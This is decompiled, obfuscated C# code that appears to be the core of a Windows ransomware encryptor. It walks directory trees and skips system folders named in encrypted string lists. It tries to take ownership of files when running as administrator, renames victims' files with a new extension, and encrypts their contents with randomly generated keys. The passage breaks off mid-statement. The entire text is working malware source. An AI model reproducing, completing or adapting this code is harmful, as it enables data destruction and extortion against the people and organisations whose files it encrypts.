using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using LHzwFzfXBAR;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using uchimBgrqYpC;

namespace FEPAnxLYcpgz;

internal sealed class ZNYsMUGPdZxeAunY
{
	public sealed class sEtcRWviDZdSUvW
	{
		private static StringCollection LbisPWBKfGEvMD;

		private static List<string> bKhDprUjIi;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107447093));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107447120)) && !text.ToLower().Contains(getString_0(107447067)) && !text.ToLower().Contains(getString_0(107367669)) && !text.ToLower().Contains(getString_0(107367688)) && !text.ToLower().Contains(getString_0(107447086)) && !text.ToLower().Contains(getString_0(107368048)) && !text.ToLower().Contains(getString_0(107367957)) && !text.ToLower().Contains(getString_0(107367972)) && !text.ToLower().Contains(getString_0(107367923)) && !text.ToLower().Contains(getString_0(107367938)) && !text.ToLower().Contains(getString_0(107367872)) && !text.ToLower().Contains(getString_0(107367887)) && !text.ToLower().Contains(getString_0(107367838)) && !text.ToLower().Contains(getString_0(107367825)) && !text.ToLower().Contains(getString_0(107367804)) && !text.ToLower().Contains(getString_0(107367823)) && !text.ToLower().Contains(getString_0(107367810)) && !text.ToLower().Contains(getString_0(107367249)) && !text.ToLower().Contains(getString_0(107367232)) && !text.Contains(IOVuiCuRiaYQ(getString_0(107367247))) && !text.Contains(getString_0(107367190)) && !text.Contains(getString_0(107367160)) && !text.EndsWith(getString_0(107411290)) && !text.EndsWith(getString_0(107367135)) && !text.EndsWith(getString_0(107367130)) && !text.EndsWith(getString_0(107367125)) && !text.EndsWith(getString_0(107367152)) && !text.ToLower().Contains(getString_0(107367147)) && !text.ToLower().Contains(wKJjmTiGCFwzP))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(zCjFWNmzzORqwHz) * 1024.0 * 1024.0 && SGdiTvXzdcycb == getString_0(107396950))
							{
								bKhDprUjIi.Add(text);
							}
							else if (File.Exists(text) && SGdiTvXzdcycb == getString_0(107396260))
							{
								bKhDprUjIi.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return bKhDprUjIi;
		}

		static sEtcRWviDZdSUvW()
		{
			Strings.CreateGetStringDelegate(typeof(sEtcRWviDZdSUvW));
			LbisPWBKfGEvMD = new StringCollection();
			bKhDprUjIi = new List<string>();
		}
	}

	private sealed class LQEDPqPJNHh
	{
		public string sIVdwnmaEI;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == sIVdwnmaEI;
		}
	}

	private sealed class zZtdToLhoqZQ
	{
		public string tACukTksbsM;

		public bool _003CIsDriveNTFS_003Eb__19(DriveInfo driveInfo_0)
		{
			return driveInfo_0.RootDirectory.Name == tACukTksbsM;
		}
	}

	private sealed class iZGnAnBGCkDJQL
	{
		private sealed class qiFqKxOEpCc
		{
			public iZGnAnBGCkDJQL HhEoXagSPtnRdMUw;

			public string TKSiYfiNXnMwSEx;

			public void _003CCrypt_003Eb__23()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					YWSmhZKmpyhSfY(WindowsIdentity.GetCurrent().Name, TKSiYfiNXnMwSEx);
				}
			}

			public void _003CCrypt_003Eb__24()
			{
				VGpCoFaKxrpD(TKSiYfiNXnMwSEx, HhEoXagSPtnRdMUw.MycBHJwfxotf, HhEoXagSPtnRdMUw.fMCdyrdLmMsL, HhEoXagSPtnRdMUw.RKHzUavcpKfub, HhEoXagSPtnRdMUw.ICdBaQxHZfqvmF);
			}
		}

		public string[] MycBHJwfxotf;

		public string[] RKHzUavcpKfub;

		public string ICdBaQxHZfqvmF;

		public string fMCdyrdLmMsL;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__22(string string_0)
		{
			qiFqKxOEpCc CS_0024_003C_003E8__locals0 = new qiFqKxOEpCc();
			CS_0024_003C_003E8__locals0.HhEoXagSPtnRdMUw = this;
			CS_0024_003C_003E8__locals0.TKSiYfiNXnMwSEx = string_0;
			if (eRHwMzVAUfqqx && !EyIUaktyBiAWZ().Contains(getString_0(107365888)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						YWSmhZKmpyhSfY(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.TKSiYfiNXnMwSEx);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (wWAWZjvXYQSD == getString_0(107396957))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					VGpCoFaKxrpD(CS_0024_003C_003E8__locals0.TKSiYfiNXnMwSEx, CS_0024_003C_003E8__locals0.HhEoXagSPtnRdMUw.MycBHJwfxotf, CS_0024_003C_003E8__locals0.HhEoXagSPtnRdMUw.fMCdyrdLmMsL, CS_0024_003C_003E8__locals0.HhEoXagSPtnRdMUw.RKHzUavcpKfub, CS_0024_003C_003E8__locals0.HhEoXagSPtnRdMUw.ICdBaQxHZfqvmF);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				VGpCoFaKxrpD(CS_0024_003C_003E8__locals0.TKSiYfiNXnMwSEx, MycBHJwfxotf, fMCdyrdLmMsL, RKHzUavcpKfub, ICdBaQxHZfqvmF);
			}
		}

		static iZGnAnBGCkDJQL()
		{
			Strings.CreateGetStringDelegate(typeof(iZGnAnBGCkDJQL));
		}
	}

	private sealed class TajjcMGKxy
	{
		private sealed class BtfkVxbqHeqSpB
		{
			public TajjcMGKxy qFRqtpZnzrSL;

			public string ypXuEqFvQXPYZ;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__32()
			{
				try
				{
					if (IgsTsyCAVSNbiX)
					{
						Console.WriteLine(getString_0(107446929) + ypXuEqFvQXPYZ + getString_0(107446936) + new FileInfo(ypXuEqFvQXPYZ).Length + getString_0(107447395));
						Console.WriteLine(getString_0(107447418), ojqyMmFKXxQzx.Count, LHsTakbnvLMZqfZlb, opDJfdSoJwBgd);
						Console.WriteLine(getString_0(107447361), wuIBqNhSkYrbJgK.Elapsed);
						Console.WriteLine(getString_0(107447304));
					}
				}
				catch
				{
				}
			}

			static BtfkVxbqHeqSpB()
			{
				Strings.CreateGetStringDelegate(typeof(BtfkVxbqHeqSpB));
			}
		}

		private sealed class QhMbbUbrJFUr
		{
			public BtfkVxbqHeqSpB wMoWlOexFmCX;

			public TajjcMGKxy qFRqtpZnzrSL;

			public string NMewwjhrbwMa;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__33()
			{
				foreach (string item in PlfqlzQrkBHY)
				{
					if (NMewwjhrbwMa.ToLower().EndsWith(item + qFRqtpZnzrSL.MYWMPxbgtmbfTdO) && rLaVjFwRdfLdr == getString_0(107396972))
					{
						if (Convert.ToInt32(KOFrqFvMUqLVa) * 1024 * 1024 > new FileInfo(NMewwjhrbwMa).Length)
						{
							try
							{
								FZYQuTJPlcz.FdLmtwIxPaLAh(getString_0(107368875), getString_0(107368902), getString_0(107368889), NMewwjhrbwMa);
							}
							catch
							{
							}
						}
					}
					else if (NMewwjhrbwMa.ToLower().EndsWith(item) && rLaVjFwRdfLdr == getString_0(107396282))
					{
						try
						{
							FZYQuTJPlcz.FdLmtwIxPaLAh(getString_0(107368875), getString_0(107368902), getString_0(107368889), NMewwjhrbwMa);
						}
						catch
						{
						}
					}
				}
			}

			static QhMbbUbrJFUr()
			{
				Strings.CreateGetStringDelegate(typeof(QhMbbUbrJFUr));
			}
		}

		private sealed class UjdWIsKCvIWmr
		{
			public TajjcMGKxy qFRqtpZnzrSL;

			public string ypXuEqFvQXPYZ;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__35()
			{
				try
				{
					if (IgsTsyCAVSNbiX)
					{
						Console.WriteLine(getString_0(107446936) + ypXuEqFvQXPYZ + getString_0(107446943) + new FileInfo(ypXuEqFvQXPYZ).Length + getString_0(107447402));
						Console.WriteLine(getString_0(107447425), ojqyMmFKXxQzx.Count, LHsTakbnvLMZqfZlb, opDJfdSoJwBgd);
						Console.WriteLine(getString_0(107447368), wuIBqNhSkYrbJgK.Elapsed);
						Console.WriteLine(getString_0(107447311));
					}
				}
				catch
				{
				}
			}

			public void _003CWorkerCrypter2_003Eb__36()
			{
				foreach (string item in PlfqlzQrkBHY)
				{
					if (ypXuEqFvQXPYZ.ToLower().EndsWith(item + qFRqtpZnzrSL.MYWMPxbgtmbfTdO) && rLaVjFwRdfLdr == getString_0(107396975))
					{
						if (Convert.ToInt32(KOFrqFvMUqLVa) * 1024 * 1024 > new FileInfo(ypXuEqFvQXPYZ).Length)
						{
							try
							{
								FZYQuTJPlcz.FdLmtwIxPaLAh(getString_0(107368878), getString_0(107368905), getString_0(107368892), ypXuEqFvQXPYZ);
							}
							catch
							{
							}
						}
					}
					else if (ypXuEqFvQXPYZ.ToLower().EndsWith(item) && rLaVjFwRdfLdr == getString_0(107396285))
					{
						try
						{
							FZYQuTJPlcz.FdLmtwIxPaLAh(getString_0(107368878), getString_0(107368905), getString_0(107368892), ypXuEqFvQXPYZ);
						}
						catch
						{
						}
					}
				}
			}

			static UjdWIsKCvIWmr()
			{
				Strings.CreateGetStringDelegate(typeof(UjdWIsKCvIWmr));
			}
		}

		public List<string> CSkUagcVHnsgV;

		public List<string> sqQpQQcELGqIJWzCd;

		public string MYWMPxbgtmbfTdO;

		public string[] xZtVzlbLhvULOy;

		public string UMxsSKxdLwMPg;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__31(string string_0)
		{
			using List<string>.Enumerator enumerator = sqQpQQcELGqIJWzCd.GetEnumerator();
			QhMbbUbrJFUr CS_0024_003C_003E8__locals0;
			while (enumerator.MoveNext())
			{
				BtfkVxbqHeqSpB CS_0024_003C_003E8__locals1 = new BtfkVxbqHeqSpB();
				CS_0024_003C_003E8__locals1.qFRqtpZnzrSL = this;
				CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ = enumerator.Current;
				if (CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(getString_0(107367759)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(getString_0(107367766)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(getString_0(107367733)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107367684)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107367703)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(getString_0(107367678)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(getString_0(107367625)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107367640)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107367595)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107367558)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107367581)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107368044)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107368050)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107368029)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(getString_0(107367972)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(getString_0(107367987)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(getString_0(107367938)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(getString_0(107367953)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(getString_0(107367904)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(getString_0(107367887)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(getString_0(107367902)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(getString_0(107367853)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(getString_0(107367840)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(getString_0(107367819)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107367838)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107367825)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107367264)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107367247)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(IOVuiCuRiaYQ(getString_0(107367262))) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(getString_0(107367205)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(getString_0(107367224)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(getString_0(107367175)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.EndsWith(MYWMPxbgtmbfTdO) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.EndsWith(getString_0(107367150)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.EndsWith(getString_0(107367145)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.EndsWith(getString_0(107367140)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.EndsWith(getString_0(107367167)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(getString_0(107367162)) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(wKJjmTiGCFwzP) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(TVaVFXxrZtbC) || CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.Contains(MBSkjCFQIZSn))
				{
					continue;
				}
				if (xZtVzlbLhvULOy.Length != 0)
				{
					string[] array = xZtVzlbLhvULOy;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0e06;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.EndsWith(MYWMPxbgtmbfTdO))
					{
						goto IL_0e06;
					}
				}
				catch (Exception)
				{
					goto IL_0e06;
				}
				if (!CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ.EndsWith(string_0) || ojqyMmFKXxQzx.Contains(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ))
				{
					continue;
				}
				if (REuQhDHRFMt == getString_0(107396965))
				{
					try
					{
						if (sdnUYDgvtpPnO.KcNiwSfGbe(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ))
						{
							sdnUYDgvtpPnO.nVpvygjXPyvs(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ);
						}
					}
					catch
					{
					}
				}
				ojqyMmFKXxQzx.Add(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ);
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						if (IgsTsyCAVSNbiX)
						{
							Console.WriteLine(BtfkVxbqHeqSpB.getString_0(107446929) + CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + BtfkVxbqHeqSpB.getString_0(107446936) + new FileInfo(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ).Length + BtfkVxbqHeqSpB.getString_0(107447395));
							Console.WriteLine(BtfkVxbqHeqSpB.getString_0(107447418), ojqyMmFKXxQzx.Count, LHsTakbnvLMZqfZlb, opDJfdSoJwBgd);
							Console.WriteLine(BtfkVxbqHeqSpB.getString_0(107447361), wuIBqNhSkYrbJgK.Elapsed);
							Console.WriteLine(BtfkVxbqHeqSpB.getString_0(107447304));
						}
					}
					catch
					{
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
				if (!JGpmykxMfw.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ)))
				{
					JGpmykxMfw.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ));
				}
				tFEmdOUcYrNKNamK(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (fKNptYRWsQNeZX)
						{
							try
							{
								File.AppendAllText(TVaVFXxrZtbC, getString_0(107365518) + CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + getString_0(107447052) + ex2.Message + getString_0(107396671));
							}
							catch (Exception)
							{
							}
						}
						opDJfdSoJwBgd++;
						goto end_IL_06b4;
					}
					if (KfMEqDPrRPT == getString_0(107396965) && new FileInfo(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ).Length > Convert.ToInt32(VwOPUhcZlsvZmR) * 1024 * 1024 && !CSkUagcVHnsgV.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new QhMbbUbrJFUr();
						CS_0024_003C_003E8__locals0.wMoWlOexFmCX = CS_0024_003C_003E8__locals1;
						CS_0024_003C_003E8__locals0.qFRqtpZnzrSL = this;
						try
						{
							if (MYWMPxbgtmbfTdO != getString_0(107365820))
							{
								if (pWNBRDgBMEak)
								{
									MYWMPxbgtmbfTdO = ACFERZKTAMdtw + MYWMPxbgtmbfTdO;
								}
								File.Move(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + MYWMPxbgtmbfTdO);
							}
						}
						catch (Exception ex4)
						{
							if (fKNptYRWsQNeZX)
							{
								try
								{
									File.AppendAllText(TVaVFXxrZtbC, getString_0(107365518) + CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + getString_0(107446991) + ex4.Message + getString_0(107396671));
								}
								catch (Exception)
								{
								}
							}
							opDJfdSoJwBgd++;
							goto end_IL_06b4;
						}
						CS_0024_003C_003E8__locals0.NMewwjhrbwMa = getString_0(107368307);
						if (MYWMPxbgtmbfTdO != getString_0(107365820))
						{
							CS_0024_003C_003E8__locals0.NMewwjhrbwMa = CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + MYWMPxbgtmbfTdO;
						}
						else
						{
							CS_0024_003C_003E8__locals0.NMewwjhrbwMa = CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ;
						}
						if (UyFfCzWWLzNEG == getString_0(107396965))
						{
							Thread thread2 = new Thread((ThreadStart)delegate
							{
								foreach (string item in PlfqlzQrkBHY)
								{
									if (CS_0024_003C_003E8__locals0.NMewwjhrbwMa.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.qFRqtpZnzrSL.MYWMPxbgtmbfTdO) && rLaVjFwRdfLdr == QhMbbUbrJFUr.getString_0(107396972))
									{
										if (Convert.ToInt32(KOFrqFvMUqLVa) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.NMewwjhrbwMa).Length)
										{
											try
											{
												FZYQuTJPlcz.FdLmtwIxPaLAh(QhMbbUbrJFUr.getString_0(107368875), QhMbbUbrJFUr.getString_0(107368902), QhMbbUbrJFUr.getString_0(107368889), CS_0024_003C_003E8__locals0.NMewwjhrbwMa);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.NMewwjhrbwMa.ToLower().EndsWith(item) && rLaVjFwRdfLdr == QhMbbUbrJFUr.getString_0(107396282))
									{
										try
										{
											FZYQuTJPlcz.FdLmtwIxPaLAh(QhMbbUbrJFUr.getString_0(107368875), QhMbbUbrJFUr.getString_0(107368902), QhMbbUbrJFUr.getString_0(107368889), CS_0024_003C_003E8__locals0.NMewwjhrbwMa);
										}
										catch
										{
										}
									}
								}
							});
							thread2.Priority = ThreadPriority.Normal;
							thread2.IsBackground = false;
							thread2.Start();
						}
						string text = ZCphZGDWjyA.BFOtjpRBWToz(32);
						string s = nLZNnVxqRyDU.rfAqHmOOmjC(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (RPSmcrMfZxWv == getString_0(107396275))
						{
							byte[] array2 = null;
							byte[] byte_ = GWOsLqMwIb.WvcDKTbtliDrPF(CS_0024_003C_003E8__locals0.NMewwjhrbwMa, Convert.ToInt32(VwOPUhcZlsvZmR) * 1024 * 1024);
							GWOsLqMwIb.isjSvDiECOPp(PwpxQaHWCtbm: (!geKzJTCQWBdPJrv) ? (jHNjZakAkEHPd ? GWOsLqMwIb.buNDQCFBoGJ(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : GWOsLqMwIb.buNDQCFBoGJ(byte_, Encoding.ASCII.GetBytes(UMxsSKxdLwMPg), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (jHNjZakAkEHPd ? COuKIqToBmSj.ECpnJyWrmVTmlfT(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : COuKIqToBmSj.ECpnJyWrmVTmlfT(byte_, Encoding.ASCII.GetBytes(UMxsSKxdLwMPg), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), PFFKOkRvQq: CS_0024_003C_003E8__locals0.NMewwjhrbwMa, lsppjlmhfssIIIt: bytes);
						}
						else if (!jHNjZakAkEHPd)
						{
							mVRsbcFAguJ.CbqbKQtEvSwyzLYaKI(CS_0024_003C_003E8__locals0.NMewwjhrbwMa, VwOPUhcZlsvZmR, UMxsSKxdLwMPg);
						}
						else
						{
							mVRsbcFAguJ.CbqbKQtEvSwyzLYaKI(CS_0024_003C_003E8__locals0.NMewwjhrbwMa, VwOPUhcZlsvZmR, text, bytes);
						}
					}
					else
					{
						if (pWNBRDgBMEak)
						{
							MYWMPxbgtmbfTdO = ACFERZKTAMdtw + MYWMPxbgtmbfTdO;
						}
						string text2 = ZCphZGDWjyA.BFOtjpRBWToz(32);
						string s2 = nLZNnVxqRyDU.rfAqHmOOmjC(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (MYWMPxbgtmbfTdO != getString_0(107365820))
						{
							if (!ZKpCkvvrIixyBkk)
							{
								if (!jHNjZakAkEHPd)
								{
									VLyxmOuvtqcVDJmc(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + MYWMPxbgtmbfTdO, IWnUVTiJnjexACCr);
								}
								else
								{
									VLyxmOuvtqcVDJmc(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + MYWMPxbgtmbfTdO, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!jHNjZakAkEHPd)
									{
										HQqsRTFrfF(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + MYWMPxbgtmbfTdO, IWnUVTiJnjexACCr);
									}
									else
									{
										HQqsRTFrfF(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + MYWMPxbgtmbfTdO, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (fKNptYRWsQNeZX)
									{
										try
										{
											File.AppendAllText(TVaVFXxrZtbC, getString_0(107365518) + CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + getString_0(107365774) + ex6.Message + getString_0(107396671));
										}
										catch (Exception)
										{
										}
									}
									opDJfdSoJwBgd++;
									goto end_IL_06b4;
								}
							}
						}
						else if (!ZKpCkvvrIixyBkk)
						{
							if (!jHNjZakAkEHPd)
							{
								VLyxmOuvtqcVDJmc(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + getString_0(107365815), IWnUVTiJnjexACCr);
							}
							else
							{
								VLyxmOuvtqcVDJmc(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + getString_0(107365815), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!jHNjZakAkEHPd)
								{
									HQqsRTFrfF(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ, IWnUVTiJnjexACCr);
								}
								else
								{
									HQqsRTFrfF(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (fKNptYRWsQNeZX)
								{
									try
									{
										File.AppendAllText(TVaVFXxrZtbC, getString_0(107365518) + CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + getString_0(107365774) + ex8.Message + getString_0(107396671));
									}
									catch (Exception)
									{
									}
								}
								opDJfdSoJwBgd++;
								goto end_IL_06b4;
							}
						}
						if (jHNjZakAkEHPd)
						{
							if (MYWMPxbgtmbfTdO != getString_0(107365820))
							{
								ZBrwuJMytAla(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ + MYWMPxbgtmbfTdO, bytes2);
							}
							else
							{
								ZBrwuJMytAla(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ, bytes2);
							}
						}
					}
					goto IL_0e06;
					end_IL_06b4:;
				}
				catch (Exception)
				{
					goto IL_0e06;
				}
				continue;
				IL_0e06:
				sqQpQQcELGqIJWzCd.Remove(CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ);
			}
		}

		public void _003CWorkerCrypter2_003Eb__34(string string_0)
		{
			UjdWIsKCvIWmr CS_0024_003C_003E8__locals0 = new UjdWIsKCvIWmr();
			CS_0024_003C_003E8__locals0.qFRqtpZnzrSL = this;
			CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ = string_0;
			if (!CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(getString_0(107367759)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(getString_0(107367766)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(getString_0(107367733)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107367684)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107367703)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(getString_0(107367678)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(getString_0(107367625)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107367640)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107367595)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107367558)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107367581)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107368044)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107368050)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107368029)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(getString_0(107367972)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(getString_0(107367987)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(getString_0(107367938)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(getString_0(107367953)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(getString_0(107367904)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(getString_0(107367887)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(getString_0(107367902)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(getString_0(107367853)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(getString_0(107367840)) && 